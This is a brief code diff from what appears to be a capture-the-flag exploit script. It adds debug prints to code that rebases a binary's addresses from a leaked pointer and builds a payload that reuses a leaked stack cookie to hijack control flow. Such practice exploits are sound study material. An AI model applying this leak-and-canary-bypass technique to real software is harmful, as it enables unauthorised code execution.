@@ -15,6 +15,9 @@ e.address += disclosed[8] - e.sym.__libc_csu_init
 
 addr = e.sym.unused_remainder_from_old_version
 
+print(disclosed)
+print(addr)
+
 payload = 'A'
 payload += p64(cookie)
 payload += p64(0)
